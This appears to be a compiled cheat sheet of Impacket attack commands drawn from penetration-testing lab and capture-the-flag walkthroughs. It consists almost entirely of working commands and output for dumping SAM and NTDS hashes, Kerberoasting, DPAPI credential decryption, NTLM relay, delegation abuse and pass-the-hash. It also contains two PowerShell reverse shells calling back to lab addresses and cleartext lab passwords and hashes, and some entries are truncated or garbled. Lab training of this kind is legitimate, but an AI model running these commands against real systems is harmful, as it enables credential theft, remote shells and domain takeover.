## Impacket - Impacket - Impacket - Impacket - Impacket - performing-attack-and-parsing-password-hashes
#cat/ATTACK #cpts
These copies can then be transferred back to the attack host, where impacket-secretsdump is used to extract the hashes:

```
impacket-secretsdump -sam SAM-2021-08-07 -system SYSTEM-2021-08-07 -security SECURITY-2021-08-07 local
```

## Impacket - Impacket - Impacket - Impacket - Impacket - performing-attack-and-parsing-password-hashes-2
#cat/ATTACK #cpts
These copies can then be transferred back to the attack host, where impacket-secretsdump is used to extract the hashes:

```
Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra
```

## Impacket - Impacket - Impacket - Impacket - Impacket - retrieving-hashes-using-secretsdumppy
#cat/ATTACK #cpts
Why do we care about a virtual hard drive (especially Windows)? If we can locate a backup of a live machine, we can access the `C:\Windows\System32\Config` directory and pull down the `SAM`, `SECURITY` and `SYSTEM` regis

```
secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL
```

## Impacket - Impacket - Impacket - Impacket - Impacket - retrieving-hashes-using-secretsdumppy-2
#cat/ATTACK #cpts
Why do we care about a virtual hard drive (especially Windows)? If we can locate a backup of a live machine, we can access the `C:\Windows\System32\Config` directory and pull down the `SAM`, `SECURITY` and `SYSTEM` regis

```
Impacket v0.9.23.dev1+20201209.133255.ac307704 - Copyright 2020 SecureAuth Corporation
```

## Impacket - Impacket - Impacket - Impacket - Impacket - credential-theft
#cat/ATTACK #cpts
Windows often stores user secrets in folders under AppData\Roaming\Microsoft , which includes subdirectories such as Credentials and Protect . These contain the encrypted credential and the master key.

```
impacket-dpapi masterkey -file 08949382-134f-4c63-b93c-ce52efc0aa88 -sid S-1-5-21-3927696377-1337352550-2781715495-1110 -password NightT1meP1dg3on14
```

## Impacket - Impacket - Impacket - Impacket - Impacket - register-an-account-and-log-in-to-the-gitlab-instance-submit-the-flag-
#cat/ATTACK #cpts
After spawning the target machine, students need to add the entry `STMIP gitlab.inlanefreight.local` into `/etc/hosts`:

```
sudo sh -c 'echo "STMIP gitlab.inlanefreight.local" >> /etc/hosts'
```

## Impacket - Impacket - Impacket - Impacket - Impacket - register-an-account-and-log-in-to-the-gitlab-instance-submit-the-flag--2
#cat/ATTACK #cpts
```
└──╼ [★]$ sudo sh -c 'echo "10.129.203.114 gitlab.inlanefreight.local" >> /etc/hosts'
```

## Impacket - Impacket - Impacket - Impacket - Impacket - retrieve-the-contents-of-the-sam-database-on-the-dev01-host-submit-the
#cat/ATTACK #cpts
Then, using `newaspcmd.asp` from within `DNN` in the proxy-ed FireFox, students need to execute the following PowerShell reverse shell command:

```
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('172.16.8.120',9999);$stream = $client.GetStream();[byte[]]$bytes = 0..65535 | %{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte =([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

## Impacket - Impacket - Impacket - Impacket - Impacket - retrieve-the-contents-of-the-sam-database-on-the-dev01-host-submit-the-2
#cat/ATTACK #cpts
Now, students need to download the three `.SAVE` files via `DNN`, one by one: Once successfully downloaded to `Pwnbox`/`PMVPN`, students need to use `secretsdump.py`, utilizing all three files as input to the tool's opti

```
secretsdump.py LOCAL -system ~/Downloads/SYSTEM.SAVE -sam ~/Downloads/SAM.SAVE -security ~/Downloads/SECURITY.SAVE
```

## Impacket - Impacket - Impacket - Impacket - Impacket - retrieve-the-contents-of-the-sam-database-on-the-dev01-host-submit-the-3
#cat/ATTACK #cpts
```
└──╼ [★]$ secretsdump.py LOCAL -system ~/Downloads/SYSTEM.SAVE -sam ~/Downloads/SAM.SAVE -security ~/Downloads/SECURITY.SAVE
```

## Impacket - Impacket - Impacket - Impacket - Impacket - retrieve-the-contents-of-the-sam-database-on-the-dev01-host-submit-the-4
#cat/ATTACK #cpts
```
$MACHINE.ACC:plain_password_hex:1f6c9b531cb2c6fca8bbe3109f41a5e2aa979ff5c551b43bf0b9b3cee72b613960ca38bb89092a676a185863d57023ccab616c45e1bc1bf732c0ff44f2b17cce55386d062f29e5b80ec1ab3bb25142ce09ded31687dc25ab4a958e341e3bf9006eb28359e4e3af3d277080020cbaebde32f2ae4f346a1d03d61d2089fde3db6f238bde091740dc9b09833e94a058f296210e6f14707a99fb071069d122938d0f1b5bb7b111304b28cd97134e92e22d886034f3c4b5c11bfba322a689c1f975222d9ca31ab427d0c3add20ca6165a82e819ccfeb25086aaaba185b235402b514efdc27269343e9b7db2971ce1fd489850
```

## Impacket - Impacket - Impacket - Impacket - Impacket - retrieve-the-contents-of-the-sam-database-on-the-dev01-host-submit-the-5
#cat/ATTACK #cpts
```
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:c3b0b7a4f728a0573287125564e7efa6
```

## Impacket - Impacket - Impacket - Impacket - Impacket - retrieve-the-contents-of-the-sam-database-on-the-dev01-host-submit-the-6
#cat/ATTACK #cpts
```
(Unknown User):Gr8hambino!
```

## Impacket - Impacket - Impacket - Impacket - Impacket - find-a-backup-script-that-contains-the-password-for-the-backupadm-user
#cat/ATTACK #cpts
The first file, `SQL Express Backup.ps1`, seems the most promising, thus, from `Pwnbox`/`PMVPN`, students need to connect to the "Departments Share" on 172.16.8.3 (proxying through `proxychains`) and download the PowerSh

```
get IT\Private\Development\"SQL Express Backup.ps1"
```

## Impacket - Impacket - Impacket - Impacket - Impacket - find-a-backup-script-that-contains-the-password-for-the-backupadm-user-2
#cat/ATTACK #cpts
```
└──╼ [★]$ proxychains smbclient -U ssmalls '//172.16.8.3/Department Shares'
```

## Impacket - Impacket - Impacket - Impacket - Impacket - perform-a-kerberoasting-attack-and-retrieve-tgs-tickets-for-all-accoun
#cat/ATTACK #cpts
Then, from `Pwnbox`/`PMVPN`, students need to run `GetUserSPNs.py`, proxying it through `proxychains` to get TGS Tickets, using the credentials `hporter:Gr8hambino!`:

```
sudo proxychains GetUserSPNs.py -dc-ip 172.16.8.3 INLANEFREIGHT.LOCAL/hporter -request -outputfile SPNS
```

## Impacket - Impacket - Impacket - Impacket - Impacket - perform-a-kerberoasting-attack-and-retrieve-tgs-tickets-for-all-accoun-2
#cat/ATTACK #cpts
```
└──╼ [★]$ sudo proxychains GetUserSPNs.py -dc-ip 172.16.8.3 INLANEFREIGHT.LOCAL/hporter -request -outputfile SPNS
```

## Impacket - Impacket - Impacket - Impacket - Impacket - set-a-fake-spn-on-the-ttimmons-user-kerberoast-this-user-and-crack-the
#cat/ATTACK #cpts
Thereafter, students need to use `GetUserSPNs.py` to perform a targeted Kerberoasting attack (supplying the password `DBAilfreight1!` when prompted to):

```
sudo proxychains GetUserSPNs.py -dc-ip 172.16.8.3 INLANEFREIGHT.LOCAL/mssqladm -request-user ttimmons
```

## Impacket - Impacket - Impacket - Impacket - Impacket - set-a-fake-spn-on-the-ttimmons-user-kerberoast-this-user-and-crack-the-2
#cat/ATTACK #cpts
```
└──╼ [★]$ sudo proxychains GetUserSPNs.py -dc-ip 172.16.8.3 INLANEFREIGHT.LOCAL/mssqladm -request-user ttimmons
```

## Impacket - Impacket - Impacket - Impacket - Impacket - set-a-fake-spn-on-the-ttimmons-user-kerberoast-this-user-and-crack-the-3
#cat/ATTACK #cpts
```
$krb5tgs$23$*ttimmons$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/ttimmons*$a8e24991afcbcb96dd7e42cf2cb17721$c14a933e6bb4242468e13116ee6371a9a53149379ad526d796c1b57b41a592873f36013e7ee3d9ebac5d714d867872b10fbe97c073f778223e92b4d25a561de7ef80cd2e3a0fee56b8e3351b4787236d8add28b206aff5b2944ef8225d8b14c14066c2ddae040ec348cedcc36c000b83268effa71cce194ad97b642e7dd4b994d3730633c947b6af80de503b712d69c190acf884166a4d941549d3fde5048a8c7b3b3c8ac621ae97f1070ecbc5faae4df78e9bcf8e2c48dfe8133c547a0b8aaf257f1cd5fc59761589ec1a5ccb164c917d78daef3207464504578eedbcf7f95711be2551875dd27d9792bc989c534af601c1dddeb5797d8
```

## Impacket - Impacket - Impacket - Impacket - Impacket - after-obtaining-domain-admin-rights-authenticate-to-the-domain-control
#cat/ATTACK #cpts
From `Pwnbox`/`PMVPN`, students need to run `secretsdump.py` through `proxychains` to dump NTDS and capture the hash of the Administrator user (supplying the password `Repeat09` when prompted to):

```
sudo proxychains secretsdump.py ttimmons@172.16.8.3 -just-dc-ntlm
```

## Impacket - Impacket - Impacket - Impacket - Impacket - after-obtaining-domain-admin-rights-authenticate-to-the-domain-control-2
#cat/ATTACK #cpts
```
└──╼ [★]$ sudo proxychains secretsdump.py ttimmons@172.16.8.3 -just-dc-ntlm
```

## Impacket - Impacket - Impacket - Impacket - Impacket - pass-the-hash-if-cracking-fails
#cat/ATTACK #cpts
If you can't crack the hash, try **NTLM relay** instead:

```
sudo responder -I tun0 -wv --no-smb
```

## Impacket - Impacket - Impacket - Impacket - Impacket - pass-the-hash-if-cracking-fails-2
#cat/ATTACK #cpts
If you can't crack the hash, try **NTLM relay** instead:

```
impacket-ntlmrelayx -tf targets.txt -smb2support
```

## Impacket - Impacket - Impacket - Impacket - Impacket - esc-1
#cat/ATTACK #cpts
Use the impacket script `addcomputer.py` with the command :

```
addcomputer.py "/<user>" -method LDAPS -computer-name $COMPUTER_NAME -computer-pass $COMPUTER_PASS -dc-ip <dc>_IP
```

## Impacket - Impacket - Impacket - Impacket - Impacket - 09---seenabledelegationprivilege
#cat/ATTACK #cpts
Once the password is changed and the attributes are appropriately configured, we will use impacket's getST.py to perform the delegation attack.

```
impacket-getST redelegate.vl/fs01\$:'Password1!' -spn cifs/dc.redelegate.vl -impersonate
```

## Impacket - Impacket - Impacket - Impacket - Impacket - 09---seenabledelegationprivilege-2
#cat/ATTACK #cpts
Now that we have the DC's service ticket for CIFS service, we will perform DCSync using impacket's secretsdump.py attack and dump the Administrator user secrets.

```
impacket-secretsdump -k dc.redelegate.vl -just-dc-user Administrator
```

## Impacket - Impacket - Impacket - Impacket - Impacket - fluffy
#cat/ATTACK #cpts
extrait du PDF Joplin: fluffy

```
smbclient '//10.10.11.69/IT' -U 'j.fleischman%J0elTHEM4n1990!' Try "help" to get a list of possible commands. smb: \> ls Upgrade_Notice.pdf A 169963 Sat May 17 10 :31:07 2025 smb: \> get Upgrade_Notice.pdf getting file \Upgrade_Notice.pdf of size 169963 as Upgrade_Notice.pdf (150.5 KiloBytes/sec) (average 150.5 KiloBytes/sec) Further down the notice, there is a table with some recent vulnerabilities that were discovered. One of them is CVE-2025-24071 , a Windows File Explorer Spoofing Vulnerability, which allows attackers to retrieve the NTLM hash of users upon extracting a ZIP file wit
```

## Impacket - Impacket - Impacket - Impacket - Impacket - tombwatcher
#cat/ATTACK #cpts
extrait du PDF Joplin: tombwatcher

```
impacket-dacledit -action 'write' -rights 'FullControl' -inheritance - principal 'john' -target-dn 'OU=ADCS,DC=TOMBWATCHER,DC=HTB' TOMBWATCHER.HTB/john: 'rogue'
```

## Impacket - Impacket - Impacket - Impacket - Impacket - vulncicada
#cat/ATTACK #cpts
extrait du PDF Joplin: vulncicada

```
impacket-psexec cicada.vl/administrator@DC-JPQ225.cicada.vl -k -hashes :85a0da53871a9d56b6cd05deda3a5e87
```

## Impacket - Impacket - Impacket - Impacket - Impacket - voleur
#cat/ATTACK #cpts
extrait du PDF Joplin: voleur

```
impacket-getTGT voleur.htb/svc_ldap -dc-ip 10.10.11.76
```

## Impacket - Impacket - Impacket - Impacket - Impacket - voleur-2
#cat/ATTACK #cpts
extrait du PDF Joplin: voleur

```
impacket-getTGT voleur.htb/svc_winrm -dc-ip 10.10.11.76
```

## Impacket - Impacket - Impacket - Impacket - Impacket - voleur-3
#cat/ATTACK #cpts
extrait du PDF Joplin: voleur

```
impacket-getTGT voleur.htb/todd.wolfe -dc-ip 10.10.11.76
```

## Impacket - Impacket - Impacket - Impacket - Impacket - voleur-4
#cat/ATTACK #cpts
extrait du PDF Joplin: voleur

```
impacket-smbclient -k
```

## Impacket - Impacket - Impacket - Impacket - Impacket - voleur-5
#cat/ATTACK #cpts
extrait du PDF Joplin: voleur

```
impacket-dpapi masterkey -file 08949382 -134f-4c63-b93c-ce52efc0aa88 -sid S-1-5-21- 3927696377-1337352550-2781715495-1110 -password NightT1meP1dg3on14
```

## Impacket - Impacket - Impacket - Impacket - Impacket - voleur-6
#cat/ATTACK #cpts
extrait du PDF Joplin: voleur

```
impacket-dpapi credential -file 772275FAD58525253490A9B0039791D3 -key 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a 9e240ce2b8a9dfb92a0d15969ccae6f550650a83
```

## Impacket - Impacket - Impacket - Impacket - Impacket - voleur-7
#cat/ATTACK #cpts
extrait du PDF Joplin: voleur

```
impacket-getTGT voleur.htb/jeremy.combs -dc-ip 10.10.11.76
```

## Impacket - Impacket - Impacket - Impacket - Impacket - voleur-8
#cat/ATTACK #cpts
extrait du PDF Joplin: voleur

```
impacket-secretsdump -ntds ntds.dit -system SYSTEM -security SECURITY LOCAL
```

## Impacket - Impacket - Impacket - Impacket - Impacket - voleur-9
#cat/ATTACK #cpts
extrait du PDF Joplin: voleur

```
impacket-getTGT voleur.htb/administrator -hashes :e656e07c56d831611b577b160b259ad2
```

## Impacket - Impacket - Impacket - Impacket - Impacket - redelegate
#cat/ATTACK #cpts
extrait du PDF Joplin: redelegate

```
impacket-getTGT redelegate.vl/marie.curie: 'Fall2024!'
```

## Impacket - Impacket - Impacket - Impacket - Impacket - redelegate-2
#cat/ATTACK #cpts
extrait du PDF Joplin: redelegate

```
impacket-getTGT redelegate.vl/HELEN.FROST: 'Password1!'
```

## Impacket - Impacket - Impacket - Impacket - Impacket - redelegate-3
#cat/ATTACK #cpts
extrait du PDF Joplin: redelegate

```
impacket-getST redelegate.vl/fs01\$: 'Password1!' -spn cifs/dc.redelegate.vl -impersonate dc
```

## Impacket - Impacket - Impacket - Impacket - Impacket - freelancer
#cat/ATTACK #cpts
extrait du PDF Joplin: freelancer

```
sudo impacket-smbserver share . -smb2support -user user -password pass PS net use z: \\10.10.14.82\share /user:user pass PS copy MEMORY.7z z:\nPS net use z: /delete
```

## Impacket - Impacket - Impacket - Impacket - Impacket - freelancer-2
#cat/ATTACK #cpts
extrait du PDF Joplin: freelancer

```
sudo impacket-smbserver share . -smb2support -user user -password pass We successfully recovered the Administrator hash for the domain and can now log in over WinRM . *Evil-WinRM* PS
```

## Impacket - Impacket - Impacket - Impacket - Impacket - freelancer-3
#cat/ATTACK #cpts
extrait du PDF Joplin: freelancer

```
secretsdump.py -sam sam -system system -ntds ntds.dit local
```

## Impacket - Impacket - Impacket - Impacket - Impacket - analysis
#cat/ATTACK #cpts
extrait du PDF Joplin: analysis

```
$remote_host = '10.10.14.61' $remote_port = 4444 $client = New-Object System . Net . Sockets . TCPClient ( $remote_host , $remote_port ) $stream = $client . GetStream () $writer = New-Object System . IO . StreamWriter ( $stream ) $prompt = " $( Get-Location )
```

## Impacket - Impacket - Impacket - Impacket - Impacket - analysis-2
#cat/ATTACK #cpts
extrait du PDF Joplin: analysis

```
Set-ADAccountPassword - Identity soc_analyst - NewPassword $NewPassword With the obtained credentials, we can log in as Administrateur using impacket-psexec (or any other preferred method) and retrieve the root flag from the administrator's desktop. The final flag can be found at C:\Users\Administrateur\Desktop\root.txt . impacket-secretsdump analysis.htb/soc_analyst: 'Password1!' @analysis.htb
```

## Impacket - Impacket - Impacket - Impacket - Impacket - rebound
#cat/ATTACK #cpts
extrait du PDF Joplin: rebound

```
Get-DomainUser -Identity Administrator userAccountControl : NORMAL_ACCOUNT [1114624] DONT_EXPIRE_PASSWORD NOT_DELEGATED getST.py rebound.htb/ldap_monitor:'1GR8t@$$4u' -spn browser/dc01.rebound.htb - impersonate DC01$ Impacket for Exegol - v0.10.1.dev1+20231106.134307.9aa93730 - Copyright 2022 Fortra - forked by ThePorgs
```

